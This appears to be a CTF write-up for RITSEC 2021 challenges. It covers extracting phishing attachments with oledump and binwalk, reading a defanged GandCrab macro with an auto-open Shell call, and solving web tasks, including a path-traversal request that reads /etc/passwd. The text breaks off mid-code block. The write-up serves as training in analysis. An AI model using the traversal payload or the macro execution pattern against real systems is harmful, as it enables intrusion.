  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob47.png
  rw-r--r--    1  ganondorf  ganondorf    13 KiB  Fri Apr  9 21:03:50 2021    blob48.png
  rw-r--r--    1  ganondorf  ganondorf   365 B    Fri Apr  9 21:03:50 2021    blob49.png
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob50.png
# ...
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob116.png
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob117.png
  rw-r--r--    1  ganondorf  ganondorf    42 KiB  Fri Apr  9 21:03:50 2021    blob118.png
  rw-r--r--    1  ganondorf  ganondorf     3 KiB  Fri Apr  9 21:03:50 2021    blob119.png
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob120.png
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob121.png
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob122.png
  rw-r--r--    1  ganondorf  ganondorf   365 B    Fri Apr  9 21:03:50 2021    blob123.png
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob124.png
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob125.png
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob126.png
  rw-r--r--    1  ganondorf  ganondorf     6 KiB  Fri Apr  9 21:03:50 2021    blob127.png
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob128.png
  rw-r--r--    1  ganondorf  ganondorf    40 KiB  Fri Apr  9 21:03:50 2021    blob129.png
  rw-r--r--    1  ganondorf  ganondorf   445 B    Fri Apr  9 21:03:50 2021    blob130.png
  rw-r--r--    1  ganondorf  ganondorf   365 B    Fri Apr  9 21:03:50 2021    blob131.png
```

Inspecting some, the majority appear to be just white (the ones that are only a few hundred bytes).

The ones that are not contain random parts of the flag, that need to be re-assembled manually. Example(s):

{{< image src="/img/CTFs/2021/ritsecCTF/parcel-blob1.png" alt="blob1.png" >}}

and:

{{< image src="/img/CTFs/2021/ritsecCTF/parcel-blob2.png" alt="blob2.png" >}}

&nbsp;
&nbsp;

I manually pieced together the flag using [Sketch](https://www.sketch.com/downloads/mac/). After doing so, this is the result:

{{< image src="/img/CTFs/2021/ritsecCTF/parcel-flag.png" alt="parcel-flag.png" >}}

Flag is `RS{Im_doing_a_v1rtual_puzzl3}`.

### PleaseClickAlltheThings 1: BegineersRITSEC.html
> Note: this challenge is the start of a series of challenges. The purpose of this CTF challenge is to bring real world phishing attachments to the challengers and attempt to find flags (previously executables or malicious domains) within the macros. This is often a process used in IR teams and becomes an extremely valuable skill. In this challenge we’ve brought to the table a malicious html file, GandCrab/Ursnif sample, and a IceID/Bokbot sample. We’ve rewritten the code to not contain malicious execution however system changes may still occur when executing, also some of the functionalities have been snipped and will likely not expose itself via dynamic analysis.
>
> * Outlook helps, with proper licensing to access necessary features
> * Otherwise oledump or similar would also help but isn’t necessary
> * CyberChef is the ideal tool to use for decoding
> Part 1: Start with the HTML file and let’s move our way up, open and or inspect the HTML file provide in the message file. There is only one flag in this document.

We're given a file to download, `Please_Click_all_the_Things.7z`.

We can extract using 7z:

```bash
7z x Please_Click_all_the_Things.7z
```

... which gives us a Microsoft outlook message, `Please Click all the Things.msg`:

```bash
file Please\ Click\ all\ the\ Things.msg
Please Click all the Things.msg: CDFV2 Microsoft Outlook Message
```

I plugged this file into [Cyberchef to decode it](https://gchq.github.io/CyberChef/#recipe=URL_Decode()), and then downloaded that resulting file.

This is the file that is downloaded after the URL decode:

```bash
file ../../url_decoded.txt
../../url_decoded.txt: Composite Document File V2 Document, Can't read SSAT
```

CyberChef just sticks the .txt on there. If we look at what's inside this blob, we see the aforementioned HTML file:

```bash
binwalk -e ../../url_decoded.txt

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
5824          0x16C0          XML document, version: "1.0"
15360         0x3C00          Zip archive data, at least v2.0 to extract, compressed size: 255, uncompressed size: 540, name: [Content_Types].xml
15664         0x3D30          Zip archive data, at least v2.0 to extract, compressed size: 192, uncompressed size: 310, name: _rels/.rels
15897         0x3E19          Zip archive data, at least v2.0 to extract, compressed size: 131, uncompressed size: 138, name: theme/theme/themeManager.xml
16086         0x3ED6          Zip archive data, at least v2.0 to extract, compressed size: 1933, uncompressed size: 8399, name: theme/theme/theme1.xml
18071         0x4697          Zip archive data, at least v2.0 to extract, compressed size: 182, uncompressed size: 283, name: theme/theme/_rels/themeManager.xml.rels
18671         0x48EF          End of Zip archive, footer length: 22
33367         0x8257          HTML document header
35738         0x8B9A          HTML document footer
41264         0xA130          Zip archive data, at least v2.0 to extract, compressed size: 427, uncompressed size: 1637, name: [Content_Types].xml
42260         0xA514          Zip archive data, at least v2.0 to extract, compressed size: 239, uncompressed size: 590, name: _rels/.rels
43060         0xA834          Zip archive data, at least v2.0 to extract, compressed size: 4960, uncompressed size: 29315, name: word/document.xml
48067         0xBBC3          Zip archive data, at least v2.0 to extract, compressed size: 322, uncompressed size: 1214, name: word/_rels/document.xml.rels
48711         0xBE47          Zip archive data, at least v2.0 to extract, compressed size: 3855, uncompressed size: 11264, name: word/vbaProject.bin
52615         0xCD87          Zip archive data, at least v1.0 to extract, compressed size: 28872, uncompressed size: 28872, name: word/media/image1.jpeg
81537         0x13E81         Zip archive data, at least v2.0 to extract, compressed size: 1746, uncompressed size: 8393, name: word/theme/theme1.xml
83334         0x14586         Zip archive data, at least v2.0 to extract, compressed size: 191, uncompressed size: 277, name: word/_rels/vbaProject.bin.rels
83585         0x14681         Zip archive data, at least v2.0 to extract, compressed size: 576, uncompressed size: 2310, name: word/vbaData.xml
84207         0x148EF         Zip archive data, at least v2.0 to extract, compressed size: 1027, uncompressed size: 2864, name: word/settings.xml
85281         0x14D21         Zip archive data, at least v2.0 to extract, compressed size: 199, uncompressed size: 306, name: customXml/item1.xml
85569         0x14E41         Zip archive data, at least v2.0 to extract, compressed size: 225, uncompressed size: 341, name: customXml/itemProps1.xml
85888         0x14F80         Zip archive data, at least v2.0 to extract, compressed size: 2906, uncompressed size: 29216, name: word/styles.xml
88839         0x15B07         Zip archive data, at least v2.0 to extract, compressed size: 295, uncompressed size: 655, name: word/webSettings.xml
89184         0x15C60         Zip archive data, at least v2.0 to extract, compressed size: 453, uncompressed size: 1419, name: word/fontTable.xml
89685         0x15E55         Zip archive data, at least v2.0 to extract, compressed size: 361, uncompressed size: 741, name: docProps/core.xml
90357         0x160F5         Zip archive data, at least v2.0 to extract, compressed size: 462, uncompressed size: 982, name: docProps/app.xml
91129         0x163F9         Zip archive data, at least v2.0 to extract, compressed size: 194, uncompressed size: 296, name: customXml/_rels/item1.xml.rels
92834         0x16AA2         End of Zip archive, footer length: 22
99630         0x1852E         Zip archive data, at least v2.0 to extract, compressed size: 399, uncompressed size: 1503, name: [Content_Types].xml
100598        0x188F6         Zip archive data, at least v2.0 to extract, compressed size: 239, uncompressed size: 590, name: _rels/.rels
101398        0x18C16         Zip archive data, at least v2.0 to extract, compressed size: 1040, uncompressed size: 3590, name: word/document.xml
102485        0x19055         Zip archive data, at least v2.0 to extract, compressed size: 300, uncompressed size: 1071, name: word/_rels/document.xml.rels
103107        0x192C3         Zip archive data, at least v2.0 to extract, compressed size: 7424, uncompressed size: 20480, name: word/vbaProject.bin
110580        0x1AFF4         Zip archive data, at least v1.0 to extract, compressed size: 224577, uncompressed size: 224577, name: word/media/image1.png
335200        0x51D60         Zip archive data, at least v2.0 to extract, compressed size: 1746, uncompressed size: 8393, name: word/theme/theme1.xml
336997        0x52465         Zip archive data, at least v2.0 to extract, compressed size: 191, uncompressed size: 277, name: word/_rels/vbaProject.bin.rels
337248        0x52560         Zip archive data, at least v2.0 to extract, compressed size: 604, uncompressed size: 2424, name: word/vbaData.xml
337898        0x527EA         Zip archive data, at least v2.0 to extract, compressed size: 957, uncompressed size: 2655, name: word/settings.xml
338902        0x52BD6         Zip archive data, at least v2.0 to extract, compressed size: 2906, uncompressed size: 29216, name: word/styles.xml
341853        0x5375D         Zip archive data, at least v2.0 to extract, compressed size: 295, uncompressed size: 655, name: word/webSettings.xml
342198        0x538B6         Zip archive data, at least v2.0 to extract, compressed size: 453, uncompressed size: 1419, name: word/fontTable.xml
342699        0x53AAB         Zip archive data, at least v2.0 to extract, compressed size: 367, uncompressed size: 741, name: docProps/core.xml
343377        0x53D51         Zip archive data, at least v2.0 to extract, compressed size: 461, uncompressed size: 982, name: docProps/app.xml
345123        0x54423         End of Zip archive, footer length: 22
347262        0x54C7E         LZMA compressed data, properties: 0xC0, dictionary size: 0 bytes, uncompressed size: 4587520 bytes
```

Notice the

```
33367         0x8257          HTML document header
35738         0x8B9A          HTML document footer
```

in the above. Use `binwalk` to extract, either specifically those offsets, or just everything (which is what I did):

```bash
binwalk --dd=".*" ../../url_decoded.txt --directory output
```

And then from the carved out files, we know that the HTML file we're interested in starts at offset `0x8257`, so we can do the following:

```bash
mv output/_url_decoded.txt.extracted/8257 output/_url_decoded.txt.extracted/8257.html
```

And then inspect this HTML file:

```html
cat output/_url_decoded.txt.extracted/8257.html | head -n 150
<html>
<head>
    <title>Its just another friendly file from you're local CTF</title>
    <style type="text/css">
        html {
            height: 100%;
            width: 100%;
        }

        #feature {
            width: 980px;
            margin: 95px auto 0 auto;
            overflow: auto;
        }

        #content {
            font-family: "Segoe UI";
            font-weight: normal;
            font-size: 22px;
            color: #ffffff;
            float: left;
            width: 460px;
            margin-top: 68px;
            margin-left: 0px;
            vertical-align: middle;
        }

            #content h1 {
                font-family: "Segoe UI Light";
                color: #ffffff;
                font-weight: normal;
                font-size: 60px;
                line-height: 48pt;
                width: 980px;
            }

        p a, p a:visited, p a:active, p a:hover {
            color: #ffffff;
        }

        #content a.button {
            background: #0DBCF2;
            border: 1px solid #FFFFFF;
            color: #FFFFFF;
            display: inline-block;
            font-family: Segoe UI;
            font-size: 24px;
            line-height: 46px;
            margin-top: 10px;
            padding: 0 15px 3px;
            text-decoration: none;
        }

            #content a.button img {
                float: right;
                padding: 10px 0 0 15px;
            }

            #content a.button:hover {
                background: #1C75BC;
            }

/* loading dots */

.loading:after {
  content: '.';
  animation: dots 1s steps(5, end) infinite}

@keyframes dots {
  0%, 20% {
    color: rgba(0,0,0,0);
    text-shadow:
      .25em 0 0 rgba(0,0,0,0),
      .5em 0 0 rgba(0,0,0,0);}
  40% {
    color: white;
    text-shadow:
      .25em 0 0 rgba(0,0,0,0),
      .5em 0 0 rgba(0,0,0,0);}
  60% {
    text-shadow:
      .25em 0 0 white,
      .5em 0 0 rgba(0,0,0,0);}
  80%, 100% {
    text-shadow:
      .25em 0 0 white,
      .5em 0 0 white;}}
    </style>
</head>
<body bgcolor="#00abec">
    <div id="feature">
            <div id="content">
                <h1 id="unavailable" class="loading">Try Harder</h1>
                <p id="tryAgain" class="loading">The Defender That Could</p>
        </div>
    </div>
</body>


  <head>
<flag="UklUU0VDe0gzcjMhdCEkfQ==">
</body>
  </html>'));</script>
```

And look at that, a nice little flag entity!

```bash
echo UklUU0VDe0gzcjMhdCEkfQ== | base64 -d
RITSEC{H3r3!t!$}
```

Flag is `RITSEC{H3r3!t!$}`.

**n.b.**: I did this challenge initially without having `oledump.py`. If you wanted to go that route (which is better, imo), it looks like so:

```bash
# Check the file
python ./oledump_V0_0_60/oledump.py Please\ Click\ all\ the\ Things.msg

# Now that we know the data for our beginner html file is object 24, get that:
python ./oledump_V0_0_60/oledump.py Please\ Click\ all\ the\ Things.msg -s 24

# Decode that object, so we can store in a file and URL decode it:
python ./oledump_V0_0_60/oledump.py Please\ Click\ all\ the\ Things.msg -s 24 -d > url_encoded

# URL Decode that file, and get the flag
```

### PleaseClickAlltheThings 2: GandCrab_Ursnif
> NOTE: this challenge builds upon BegineersRITSEC.html, and that challenge must be completed first.
>
> GandCrab/Ursnif are dangerous types of campaigns and malware, macros are usually the entry point, see what you can find, there are two flags in this document. Flag1/2

So, after a bit of digging on Google for Microsoft forensics tools, I [came across the site for didierstevens](https://blog.didierstevens.com/), and was reminded at how great a success I've had when using their previous tools.

As such, I ended up utilizing [oledump.py](https://blog.didierstevens.com/programs/oledump-py/) from their site, in order to examine the objects in the stream related to this Outlook message:


```bash
python ./oledump_V0_0_60/oledump.py -q -p ./oledump_V0_0_60/plugin_msg.py Please\ Click\ all\ the\ Things.msg
```

... which gives us:

```
  2: "0FF9 0102: BIN ?                         b'\\x00\\x00\\x00\\x00'"
  3: 3001 001F: UNI Display name              IceID_Bokbot_RITSEC.docm
  4: "3701 0102: BIN Attachment data           b'PK\\x03\\x04\\x14\\x00\\x06\\x00\\x08\\x00\\x00"
  5: "3702 0102: BIN ?                         b''"
  6: 3703 001F: UNI Attach extension          .docm
  7: 3704 001F: UNI Attach filename           IceID_Bokbot_RITSEC.docm
  8: 3707 001F: UNI Attach long filename      IceID_Bokbot_RITSEC.docm
  9: "3709 0102: BIN ?                         b'\\x01\\x00\\t\\x00\\x00\\x03\\xdc\\x06\\x00\\x00"
 10: 8000 001F: UNI ?
 12: "0FF9 0102: BIN ?                         b'\\x01\\x00\\x00\\x00'"
 13: 3001 001F: UNI Display name              GandCrab_Ursnif_RITSEC.docm
 14: "3701 0102: BIN Attachment data           b'PK\\x03\\x04\\x14\\x00\\x06\\x00\\x08\\x00\\x00"
 15: "3702 0102: BIN ?                         b''"
 16: 3703 001F: UNI Attach extension          .docm
 17: 3704 001F: UNI Attach filename           GandCrab_Ursnif_RITSEC.docm
 18: 3707 001F: UNI Attach long filename      GandCrab_Ursnif_RITSEC.docm
 19: "3709 0102: BIN ?                         b'\\x01\\x00\\t\\x00\\x00\\x03\\xdc\\x06\\x00\\x00"
 20: 8000 001F: UNI ?
 22: "0FF9 0102: BIN ?                         b'\\x02\\x00\\x00\\x00'"
 23: 3001 001F: UNI Display name              BeginnersRITSEC.html
 24: '3701 0102: BIN Attachment data           b\'<script language="javascript">document'
 25: "3702 0102: BIN ?                         b''"
 26: 3703 001F: UNI Attach extension          .html
 27: 3704 001F: UNI Attach filename           BEGINN~1.HTM
 28: 3707 001F: UNI Attach long filename      BeginnersRITSEC.html
 29: "3709 0102: BIN ?                         b'\\x01\\x00\\t\\x00\\x00\\x03\\xdc\\x06\\x00\\x00"
 30: 8000 001F: UNI ?
 31: "0002 0102: BIN ?                         b'\\x7f\\x7f5\\x96\\xe1Y\\xd0G\\x99\\xa7FQ\\\\\\x1"
 32: "0003 0102: BIN ?                         b'\\x00\\x00\\x00\\x00\\x07\\x00\\x00\\x000\\x00\\"
 33: "0004 0102: BIN ?                         b'*\\x00\\x00\\x00A\\x00t\\x00t\\x00a\\x00c\\x00"
 34: "1000 0102: BIN Message body              b'\\xacb\\x0c\\xff\\t\\x00\\x0e\\x00'"
 35: "1003 0102: BIN ?                         b'\\x10\\x85\\x00\\x00\\x08\\x00\\x08\\x00'"
 36: "1007 0102: BIN ?                         b'R\\x85\\x00\\x00\\x08\\x00\\x04\\x00\\xbf\\x85\\"
 37: "1009 0102: BIN RTF Compressed            b'T\\x85\\x00\\x00\\x08\\x00\\x05\\x00'"
 38: "100C 0102: BIN ?                         b'\\xd5\\xc9\\x07\\x8e\\x07\\x00\\x01\\x00'"
 39: "1010 0102: BIN ?                         b'\\x0e\\x85\\x00\\x00\\x08\\x00\\x07\\x00'"
 40: "1012 0102: BIN ?                         b'\\xc8\\x8e1\\xa1\\x07\\x00\\x00\\x00'"
 41: "1013 0102: BIN ?                         b'\\x01\\x85\\x00\\x00\\x08\\x00\\x03\\x00'"
 42: "1014 0102: BIN ?                         b'\\xeb\\x85\\x00\\x00\\x08\\x00\\r\\x00'"
 43: "1015 0102: BIN ?                         b'\\x03\\x85\\x00\\x00\\x08\\x00\\x02\\x00'"
 44: "1018 0102: BIN ?                         b'\\x06\\x85\\x00\\x00\\x08\\x00\\x06\\x00'"
 45: "101A 0102: BIN ?                         b'\\x18\\x85\\x00\\x00\\x08\\x00\\t\\x00\\xc2\\x85"
 46: "101B 0102: BIN ?                         b'\\xc3\\x85\\x00\\x00\\x08\\x00\\x0c\\x00'"
 49: "0FF6 0102: BIN ?                         b'\\x00\\x00\\x01k'"
 50: "0FF9 0102: BIN ?                         b'\\x00\\x00\\x00\\x00\\x81+\\x1f\\xa4\\xbe\\xa3\\"
 51: "0FFF 0102: BIN ?                         b'\\x00\\x00\\x00\\x00\\x81+\\x1f\\xa4\\xbe\\xa3\\"
 52: 3001 001F: UNI Display name              CTF@challengers.com
 53: 3002 001F: UNI Address type              SMTP
 54: 3003 001F: UNI Email address             CTF@challengers.com
 55: "300B 0102: BIN ?                         b'SMTP:CTF@CHALLENGERS.COM\\x00'"
 56: 5FF6 001F: UNI To       (?)              CTF@challengers.com
 57: "5FF7 0102: BIN ?                         b'\\x00\\x00\\x00\\x00\\x81+\\x1f\\xa4\\xbe\\xa3\\"
 58: 001A 001F: UNI Message class             IPM.Note
 59: 0037 001F: UNI Subject                   Please Click all the Things
 60: 003D 001F: UNI Subject prefix
 61: 0070 001F: UNI Topic                     Please Click all the Things
 62: "0071 0102: BIN ?                         b'\\x01\\xd7\\x0b\\x95Y%\\xab+R\\xee`KN\\x07\\xa"
 63: 0E02 001F: UNI Display BCC
 64: 0E03 001F: UNI Display CC
 65: '0E04 001F: UNI Display To                CTF@challengers.com\x00'
 66: 0E1D 001F: UNI Subject (normalized)      Please Click all the Things
 67: '1000 001F: UNI Message body              Hey there Challengers,\r\n \r\nI’ve attached'
 68: "1009 0102: BIN RTF Compressed            b'\\xa0#\\x00\\x00v\\xaa\\x00\\x00LZFu^\\xd3w&\\"
 69: "300B 0102: BIN ?                         b'Y\\x9b\\xa06%\\xc5%E\\x80\\xb0\\xc6\\xff\\xb8\\"
 70: 8005 001F: UNI ?                         16.0
 71: "800B 0102: BIN ?                         b'PK\\x03\\x04\\x14\\x00\\x06\\x00\\x08\\x00\\x00"
 72: '800C 0102: BIN ?                         b\'<?xml version="1.0" encoding="UTF-8" s'
 73: "800E 0102: BIN ?                         b'2\\xd15\\rg\\xae\\xe6N\\xb0\\xa1S\\xc7\\xe73\\x"
```


So, a few things stick out:

1. We see a kind of message, at object **67**.
2. We see artifacts relating to our desired `GandCrab_Ursnif_RITSEC.docm` (and `BeginnersRITSEC.html` from first challenge)

We can inspect the objects like so, still using oledeump (via the `-d` and `-s <OBJECT ID>` flags):

```bash
python oledump.py -p ./oledump_V0_0_60/plugin_msg.py Please\ Click\ all\ the\ Things.msg -s 67 -d
```

Which gives:

```
Hey there Challengers,

I ve attached some malware, please do click them and infect your machines (seriously), wipe your systems after the CTF.

On a less troll note, for those new to analysis start with the HTML, move to GandCrab, and then if you re feeling smart try IceID/Bokbot.

If you feel the need to bang your head please take safety precautions, clear away breakables including computer screens and preferably choose a softer surface to avoid injuries.

Thanks for contributing to the botnet.

Sincerely,
CTF Challenge Creators
```

Nice. So now to get the `.docm` file out, we can grab the binary data that is represented by it, based on the output of the previous oledump (using the `-q` flag here to only output the plugin results):

```
python ./oledump_V0_0_60/oledump.py -q -p ./oledump_V0_0_60/plugin_msg.py Please\ Click\ all\ the\ Things.msg
...
 13: 3001 001F: UNI Display name              GandCrab_Ursnif_RITSEC.docm
 14: "3701 0102: BIN Attachment data           b'PK\\x03\\x04\\x14\\x00\\x06\\x00\\x08\\x00\\x00"
 15: "3702 0102: BIN ?                         b''"
 16: 3703 001F: UNI Attach extension          .docm
 17: 3704 001F: UNI Attach filename           GandCrab_Ursnif_RITSEC.docm
 18: 3707 001F: UNI Attach long filename      GandCrab_Ursnif_RITSEC.docm
...
```

So we want to extract object **14**:

```
python ./oledump_V0_0_60/oledump.py -p ./oledump_V0_0_60/plugin_msg.py Please\ Click\ all\ the\ Things.msg -s 14 -d > GandCrab_Ursnif_RITSEC.docm
```

Double checking resulting file looks good:

```bash
file GandCrab_Ursnif_RITSEC.docm
GandCrab_Ursnif_RITSEC.docm: Microsoft Word 2007+
```

Now, we can run `oledump.py` again, this time against this file:

```
python ../../oledump_V0_0_60/oledump.py GandCrab_Ursnif_RITSEC.docm
A: word/vbaProject.bin
 A1:       464 'PROJECT'
 A2:        89 'PROJECTwm'
 A3: M     975 'VBA/Module1'
 A4: M    1504 'VBA/Module4'
 A5: m     938 'VBA/ThisDocument'
 A6:      3109 'VBA/_VBA_PROJECT'
 A7:       585 'VBA/dir'
```

So it looks like it is a VBA project, which we can also summarize like so:

```
python ./oledump_V0_0_60/oledump.py -p ./oledump_V0_0_60/plugin_vba_summary.py GandCrab_Ursnif_RITSEC.docm
A: word/vbaProject.bin
 A1:       464 'PROJECT'
 A2:        89 'PROJECTwm'
 A3: M     975 'VBA/Module1'
               Plugin: VBA summary plugin
                 Attribute VB_Name = "Module1"
                 Sub autoopen()
 A4: M    1504 'VBA/Module4'
               Plugin: VBA summary plugin
                 Attribute VB_Name = "Module4"
                 Function TheDarkSide()
 A5: m     938 'VBA/ThisDocument'
               Plugin: VBA summary plugin
                 Attribute VB_Name = "ThisDocument"
                 Attribute VB_Base = "1Normal.ThisDocument"
 A6:      3109 'VBA/_VBA_PROJECT'
 A7:       585 'VBA/dir'
```

To my unexperienced eyes, it seems as if it would be auto running the `TheDarkSide()` function. For reference, we can look at that partially like so:

```
python ../../oledump_V0_0_60/oledump.py -p ../../oledump_V0_0_60/plugin_vba_routines.py GandCrab_Ursnif_RITSEC.docm
```

which dumps out this:

```
A: word/vbaProject.bin
 A1:       464 'PROJECT'
 A2:        89 'PROJECTwm'
 A3: M     975 'VBA/Module1'
               Plugin: VBA Routines plugin
                 Attribute VB_Name = "Module1"
                 --------------------------------------------------------------------------------
                 Sub autoopen()
                 TheDarkSide
                 End Sub

 A4: M    1504 'VBA/Module4'
               Plugin: VBA Routines plugin
                 Attribute VB_Name = "Module4"
                 --------------------------------------------------------------------------------
                 Function TheDarkSide()
                 On Error Resume Next
                 CTF = Array(ElonMusk, StarWars, HelloWorld, Interaction.Shell(CleanString(Chewbacca.TextBox1), 43 - 43), Mars)
                    Select Case Research
                             Case 235003991
                             CompetitorSkillz = That_of_a_Storm_Troopers_Aim_Research_Pending
                             Flag = RITSEC{M@CROS}
                             PendingResearch = Oct(Date + CStr(TimeStamp + Log(241371097) - PewPew / Hex(13775121)))
                       End Select
                 End Function

 A5: m     938 'VBA/ThisDocument'
               Plugin: VBA Routines plugin
                 Attribute VB_Name = "ThisDocument"
                 Attribute VB_Base = "1Normal.ThisDocument"
                 Attribute VB_GlobalNameSpace = False
                 Attribute VB_Creatable = False
                 Attribute VB_PredeclaredId = True
                 Attribute VB_Exposed = True
                 Attribute VB_TemplateDerived = True
                 Attribute VB_Customizable = True

 A6:      3109 'VBA/_VBA_PROJECT'
 A7:       585 'VBA/dir'
```

The flag is right there in the output. But, let's say I didn't know about that plugin at the time. Going back to the original oledump output for the file, we can see two VBA modules, at **A3** and **A4**. Let's go ahead and extract those (same methodology as above, `-s <ID> -d`):

```
python ../../oledump_V0_0_60/oledump.py -s A3 GandCrab_Ursnif_RITSEC.docm -d > a3_bin
python ../../oledump_V0_0_60/oledump.py -s A4 GandCrab_Ursnif_RITSEC.docm -d > a4_bin
```

Looking at `a3_bin`, we don't see much in the way of `strings`:

```
strings a3_bin
Attribut
e VB_Nam
e = "Mod
ule1"
ub autoo
pen()
heDarkSi
End
```

However, on `a4_bin`, we can see the flag string:

```
strings a4_bin
            Flag = RITSEC{M@CROS}
Attribut
e VB_Nam
e = "Mod
ule4"
unction
TheDarkS
ide()
n Error
Resu
hNex@t
rray(Elo
...
```

Flag is `RITSEC{M@CROS}`.

## Web
### Robots
> Robots are taking over. Find out more.
>
> 34.69.61.54:5247
>
> Author: f1rehaz4rd

Given the site URL, and the name of the challenge, we probably are interested in the `/robots.txt` file:

{{< image src="/img/CTFs/2021/ritsecCTF/robots-flag.png" alt="robots-flag.png" >}}

Scrolling through here, we find the following entry:

```
...
        Disallow: /patents/download/
        Disallow: /patents/pdf/
        Disallow: /patents/related/
        Disallow: /scholar
        Disallow: /citations?
        Allow: /flag/UlN7UjBib3RzX2FyM19iNGR9
        Allow: /citations?user=
        Disallow: /citations?*cstart=
        Allow: /citations?view_op=new_profile
        Allow: /citations?view_op=top_venues
        Allow: /scholar_share
...
```

Notice, that **Allow: /flag/UlN7UjBib3RzX2FyM19iNGR9** entry. Navigating to that in the browser yields a 404. After a bit of guessing, I realized I should try to base64 decode the value, as it looked like an appropriate blob.

So,

```bash
echo UlN7UjBib3RzX2FyM19iNGR9 |base64 -d
RS{R0bots_ar3_b4d}
```

Boom.

Flag is `RS{R0bots_ar3_b4d}`.

* Fun fact: there is a flag.txt entry in all black font on the `/` of the page. If you navigate to it, it gives you the following string:

```
VW05aWIzUnpJR0Z5WlNCMFlXdHBibWNnYjNabGNpQXVMaTQ9
```

Which is "The robots are taking over..." base64 encoded _twice_.

* Fun fact 2: Navigating to `/flag` on the website gives you a Rick Roll redirect (imo, it should be illegal for YT to spoil rickroll redirects with ads before the video plays, but I digress...)


### Revolution
> The robots are taking over. They are posting their propaganda everywhere. Go here to find out more about it.
>
> 34.69.61.54:8799
>
> Might want to check out Robots first.
> Hint: Almost all the important information you need is on the root page. Read carefully.
>
> THE HINTS ARE FREE.
>
> * **Hint 1**: Repeat the propoganda in your crafted message to the leaders at the proper address.
> * **Hint 2**: Make sure you aren't encoding your message when sending it. Just use plain text when sending.
> * **Hint 3**: Use your head [2]

The site looks like this:

{{< image src="/img/CTFs/2021/ritsecCTF/revolition-home.gif" alt="revolition-home.gif" >}}

I tried `/robots.txt` first, which results in a 404. As does `/flag`, `/FLAG`, etc... So that doesn't seem to be it.

After stumbling around the site trying various words mentioned on the home page, I ended up trying the `/revolution` route, as mentioned in the bottom of the page:

```bash
curl http://34.69.61.54:8799/revolution
```

... response:

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

Which is better than a 404! That means the page/route exists there, we just aren't passing it the right options. I tried `GET/POST/OPTIONS`/etc, but none of which where allowed.

I looked at the hints at this point, and the third of which caught my attention:

> * **Hint 3**: Use your head [2]

So how about we try sending a [`--head`](https://beamtic.com/head-request-curl) request?

```bash
curl --HEAD http://34.69.61.54:8799/revolution
```

```html
HTTP/1.0 405 METHOD NOT ALLOWED
Content-Type: text/html; charset=utf-8
Allow: OPTIONS, UNLOCK
Content-Length: 178
Server: Werkzeug/1.0.1 Python/3.7.3
Date: Sat, 10 Apr 2021 14:27:21 GMT
```

Nice, so `UNLOCK` looks like what we want. If we try sending just that:

```bash
curl -X UNLOCK http://34.69.61.54:8799/revolution
```

... we get back:

```html
<!-- templates/index.html -->
<html>
  <head>
    <title>404 ;)</title>
  </head>
  <body>
        <h1>404 ;)</h1>
  </body>
</html>
```

Now, we just need to figure out the "right crafted message"...

> Send me the right crafted message and you can join the revolution. Only then can we unlock your full potiential.

The challenge description/hint mention _head 2_. Originally, I thought this only meant to refer to the `--head` option to learn about the `UNLOCK`. But after a while, my teammate datajerk mentioned:

> H2's?

Which, when looking at the website, made sense. This correlated to each of the **Friendly**, **Caring**, **Laws**, **Protect** sections.

As such, I sent this payload:

```curl
curl -X UNLOCK -H "User-Agent: Robot-Queto-v1.2" http://34.69.61.54:8799/revolution -d 'Friendly Caring Laws Protect'
```

But no dice. After quite some time (a few hours) and talking with the author, I learned that the challenge description was updated to be made quite a bit more clear.

I noticed now:

> They expect a special type of request and only have the ability to read plain text from a special agent. ONLY SEND PLAIN TEXT DATA.

The _ONLY SEND PLAIN TEXT DATA_ is what stood out to me. As it turns out, [the -d flag will by default send `Content-Type: application/x-www-form-urlencoded`](https://stackoverflow.com/a/43056956). Per that SO comment, we can specify `text/plain` explicitly like so, and this gives the flag:

```bash
curl -X UNLOCK -H "Content-Type: text/plain" -H "User-Agent: Robot-Queto-v1.2" http://34.69.61.54:8799/revolution -d 'Friendly Caring Laws Protect'
```

Flag is `RS{W3lc0me_t0_th3_R3volut1on}`.

### Sessions
> Find the flag.
>
> http://34.69.61.54:4777
>
> Author: f1rehaz4rd

Navigate to the site, and be presented with a login prompt. Reading the source code of the page, it states the login information is **iroh:iroh**.

Enter **iroh** for username and password and login.

Once logged in, reading around the pages yields nothing. As the name of the challenge is _sessions_, check the cookies. We find one _sessiontoken_, whose value is `UlN7MG5seV9PbmVfczNzc2lvbl90b2szbn0=`.

```bash
echo UlN7MG5seV9PbmVfczNzc2lvbl90b2szbn0= | base64 -d
RS{0nly_One_s3ssion_tok3n}
```

Flag is `RS{0nly_One_s3ssion_tok3n}`.

### DababyWeb
> Dababy wanted to share a message, but he seemed to put it too high up...
>
> 34.72.118.158:6284
>
> Author: Darkfowl

Navigating to the site, we see:

> "Dababy has his secret message hidden somwhere, but how can we read it?"
>
> * Dababy's Name Judgement
> * Dababy's Images

The first page, Dababy's name judgement, provides us a textbox that we can input data into, and it is echo'ed back to us with

> "**\<input\>** Is a Cool Name Lesss Go!"

So it seems like we are going to be able to exploit this, depending on how the service is written. Before I got into the textbox, I looked at the other page option, dababy's images.

When navigating there, notice the form of the URL:

* http://34.72.118.158:6284/fun1.php?file=suge

**/fun1.php?file=suge** is a dead giveaway for LFI on easy web challenges. Trying `/fun1.php?file=../../../../../etc/passwd` for example, we get back the `/etc/passwd` contents:

```none
